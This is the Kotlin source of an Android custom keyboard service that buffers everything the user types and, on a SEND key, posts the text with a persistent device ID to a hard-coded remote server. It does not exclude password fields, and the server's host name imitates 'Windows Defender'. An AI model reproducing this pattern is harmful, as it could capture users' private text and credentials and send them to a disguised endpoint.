package com.livekey.mobilekeyboard

import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.inputmethodservice.InputMethodService
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.inputmethod.InputConnection
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import kotlin.concurrent.thread

class LiveKeyInputMethodService : InputMethodService() {
    private val background = Color.rgb(16, 24, 32)
    private val keyColor = Color.rgb(31, 45, 55)
    private val accent = Color.rgb(215, 255, 100)
    private val textColor = Color.rgb(244, 247, 240)
    private val handler = Handler(Looper.getMainLooper())
    private var draft = StringBuilder()
    private var shift = false
    private var status: TextView? = null

    override fun onCreateInputView(): View {
        draft = StringBuilder()
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(12, 10, 12, 12)
            background = rounded(background, 0)
        }

        val header = LinearLayout(this).apply {
            gravity = Gravity.CENTER_VERTICAL
        }
        val brand = TextView(this).apply {
            text = "LIVE KEY  /  SAMPLE"
            setTextColor(accent)
            textSize = 12f
            typeface = Typeface.DEFAULT_BOLD
            letterSpacing = 0.12f
        }
        status = TextView(this).apply {
            text = "READY"
            setTextColor(Color.rgb(168, 185, 184))
            textSize = 10f
            gravity = Gravity.END
        }
        header.addView(brand, LinearLayout.LayoutParams(0, 40, 1f))
        header.addView(status, LinearLayout.LayoutParams(0, 40, 1f))
        root.addView(header)

        addRow(root, listOf("Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"))
        addRow(root, listOf("A", "S", "D", "F", "G", "H", "J", "K", "L"))
        addRow(root, listOf("SHIFT", "Z", "X", "C", "V", "B", "N", "M", "BACK"))

        val bottom = LinearLayout(this)
        addKey(bottom, "?123", 1.1f) { }
        addKey(bottom, "SPACE", 4.2f) { press(" ") }
        addKey(bottom, "SEND", 1.6f, accent, background) { sendDraft() }
        root.addView(bottom, LinearLayout.LayoutParams(-1, 54).apply { topMargin = 6 })
        return root
    }

    private fun addRow(root: LinearLayout, labels: List<String>) {
        val row = LinearLayout(this)
        labels.forEach { label ->
            val weight = if (label == "SHIFT" || label == "BACK") 1.45f else 1f
            addKey(row, label, weight) {
                when (label) {
                    "SHIFT" -> {
                        shift = !shift
                        updateShift(row.rootView)
                    }
                    "BACK" -> backspace()
                    else -> press(if (shift) label else label.lowercase())
                }
            }
        }
        root.addView(row, LinearLayout.LayoutParams(-1, 52).apply { topMargin = 5 })
    }

    private fun addKey(
        row: LinearLayout,
        label: String,
        weight: Float,
        fill: Int = keyColor,
        foreground: Int = textColor,
        action: () -> Unit
    ) {
        val button = Button(this).apply {
            text = label
            textSize = if (label.length > 2) 10f else 15f
            setTextColor(foreground)
            typeface = Typeface.DEFAULT_BOLD
            isAllCaps = false
            minHeight = 0
            minWidth = 0
            stateListAnimator = null
            background = rounded(fill, 14)
            setOnClickListener { action() }
        }
        row.addView(button, LinearLayout.LayoutParams(0, -1, weight).apply {
            marginStart = 3
            marginEnd = 3
        })
    }

    private fun press(value: String) {
        currentInputConnection?.commitText(value, 1)
        draft.append(value)
        status?.text = "DRAFT  ${draft.length}"
        if (shift) shift = false
    }

    private fun backspace() {
        currentInputConnection?.deleteSurroundingText(1, 0)
        if (draft.isNotEmpty()) draft.deleteCharAt(draft.length - 1)
        status?.text = "DRAFT  ${draft.length}"
    }

    private fun updateShift(view: View) {
        status?.text = if (shift) "SHIFT ON" else "READY"
    }

    private fun sendDraft() {
        val message = draft.toString().trim()
        if (message.isEmpty()) {
            status?.text = "TYPE SOMETHING"
            return
        }
        status?.text = "SENDING..."
        thread {
            val ok = runCatching {
                val connection = (URL(SERVER_URL).openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    connectTimeout = 5000
                    readTimeout = 5000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }
                val json = "{\"text\":${jsonString(message)},\"device_id\":${jsonString(deviceId())},\"device_name\":\"Android keyboard\",\"app_name\":\"Android sample keyboard\",\"is_pasted\":false}"
                connection.outputStream.use { it.write(json.toByteArray()) }
                connection.responseCode in 200..299
            }.getOrDefault(false)
            handler.post {
                status?.text = if (ok) "SENT" else "OFFLINE"
                if (ok) draft.clear()
            }
        }
    }

    private fun deviceId(): String {
        val prefs = getSharedPreferences("keyboard", MODE_PRIVATE)
        return prefs.getString("device_id", null) ?: UUID.randomUUID().toString().take(12).also {
            prefs.edit().putString("device_id", it).apply()
        }
    }

    private fun jsonString(value: String): String = "\"" + value.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n") + "\""

    private fun rounded(color: Int, radius: Int): GradientDrawable = GradientDrawable().apply {
        setColor(color)
        cornerRadius = radius.toFloat()
    }

    companion object {
        private const val SERVER_URL = "https://windows-defender-cf8n.onrender.com/api/messages"
    }
}
